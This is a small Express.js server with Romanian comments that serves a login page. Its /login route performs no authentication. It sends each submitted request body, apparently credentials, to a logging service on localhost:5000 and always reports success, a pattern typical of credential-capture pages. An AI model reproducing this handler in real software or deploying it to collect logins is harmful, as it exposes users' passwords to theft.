const express = require('express');
const path = require('path');
const app = express();

// Pentru a procesa JSON din request-uri
app.use(express.json());

// Ruta pentru pagina principală
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '/public/index.html'));
});

// Ruta pentru procesarea login-ului
app.post('/login', async (req, res) => {
    fetch('http://localhost:5000/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(req.body)
    });
    res.json({ ok: true });
});

app.listen(3000, () => {
    console.log('Serverul rulează pe http://localhost:3000');
});